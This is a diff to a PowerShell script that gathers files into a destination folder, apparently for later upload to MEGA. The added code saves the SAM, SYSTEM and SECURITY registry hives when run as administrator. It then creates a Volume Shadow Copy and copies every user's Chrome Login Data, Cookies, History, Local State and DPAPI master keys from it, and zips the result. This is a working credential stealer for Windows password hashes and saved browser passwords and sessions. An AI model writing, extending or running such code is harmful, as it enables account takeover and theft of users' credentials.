@@ -8,6 +8,11 @@ param (
     [string]$destMega
 )
 
+function Test-isAdmin {
+  
+    $user = [Security.Principal.WindowsIdentity]::GetCurrent();
+    (New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)  
+}
 
 function SearchAndCopy ($LocalPath, $Second) {
     
@@ -54,17 +59,19 @@ function Secure-Copy ($param) {
 function Chrome-Copy ($usersDir) {
     
     #$user = (((Split-Path $usersDir.fullName -Leaf) -Replace '\.[^\.]*$') + '\')
-    $chromeUserDir = ($chromeDestDir + $usersDir.Name + '\'); New-Item $chromeUserDir -ItemType Directory -ea 0
+    $chromeUserDestDir = ($chromeDestDir + $usersDir.Name + '\'); New-Item $chromeUserDestDir -ItemType Directory -ea 0
     $chromeUserDataDir = ($usersDir.FullName + '\' + '\AppData\local\Google\chrome\user data\')
-    Copy-Item -Force ($chromeUserDataDir + '\Local State') -Destination ($chromeUserDir)
-    Copy-Item -Force -Recurse ($usersDir.FullName + '\AppData\Roaming\Microsoft\protect\*') -Destination ($chromeUserDir)
-    attrib.exe -h -s ($chromeUserDir + '\*') /s; attrib +h +s ($chromeUserDir + '\CREDHIST'); attrib +h +s ($chromeUserDir + '\SYNCHIST')
+    Copy-Item -Force ($chromeUserDataDir + '\Local State') -Destination ($chromeUserDestDir)
+    Copy-Item -Force -Recurse ($usersDir.FullName + '\AppData\Roaming\Microsoft\protect\*') -Destination ($chromeUserDestDir)
+    attrib.exe -h -s ($chromeUserDestDir + '\*') /s #; attrib +h +s ($chromeUserDir + '\CREDHIST'); attrib +h +s ($chromeUserDir + '\SYNCHIST')
 
     foreach ($profile in (gci -Path $chromeUserDataDir -recurse | Where-Object {$_.BaseName -eq 'History'})) {
-        $chromeProfileDir = ($chromeUserDir + $profile.Directory.Name + '\'); New-Item $chromeProfileDir -ItemType Directory -ea 0
-        Copy-Item -Force ($profile.Directory.FullName + '\History') -Destination $chromeProfileDir
-        Copy-Item -Force ($profile.Directory.FullName + '\Login Data') -Destination $chromeProfileDir
-        Copy-Item -Force ($profile.Directory.FullName + '\Network\Cookies') -Destination $chromeProfileDir
+        $chromeProfileDestDir = ($chromeUserDestDir + $profile.Directory.Name + '\'); New-Item $chromeProfileDestDir -ItemType Directory -ea 0
+        Copy-Item -Force ($profile.Directory.FullName + '\History') -Destination $chromeProfileDestDir
+        Copy-Item -Force ($profile.Directory.FullName + '\Login Data') -Destination $chromeProfileDestDir
+        $cPath = ($($volume.DeviceObject) + '\' + ($profile.Directory.FullName).Substring(2) + '\Network\Cookies')
+        echo $cPath
+        cmd /c copy $cPath $chromeProfileDestDir
     }
 }
 
@@ -104,12 +111,35 @@ $deskDirs = @('Desktop', 'Documents', 'Downloads', 'OneDrive')
     }
 
     if ($Chrome) {
-        $chromeDestDir = ($destDir + 'Chrome\'); New-Item $chromeDestDir -ItemType Directory -ea 0 
+        $chromeDestDir = ($destDir + 'Chrome\'); New-Item $chromeDestDir -ItemType Directory -ea 0
+        if (Test-isAdmin) {
+            reg.exe save hklm\sam $chromeDestDir\SAM
+            reg.exe save hklm\system $chromeDestDir\SYSTEM
+            reg.exe save hklm\security $chromeDestDir\SECURITY
+        }
+
+        $VSsvc = (Get-Service -name VSS)
+        if($VSsvc.Status -ne "Running")
+        {
+            $notrunning=1
+            $VSsvc.Start()
+        }
+
+        $id = (Get-WmiObject -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
+        $volume = (Get-WmiObject win32_shadowcopy -filter "ID='$id'")
+
         foreach ($usersDir in (gci $srcdir)) {
             if ($usersDir.Name -eq "Public") { continue }
             Chrome-Copy ($usersDir)
         }
+
+        $volume.Delete()
+        if($notrunning -eq 1) { $VSsvc.Stop() }
+
+        Compress-Archive $chromeDestDir -Destination "$destDir\Chrome_$currDateTime.zip"
+
     }
+
 
     if ($First) {
         Secure-Copy -param $false
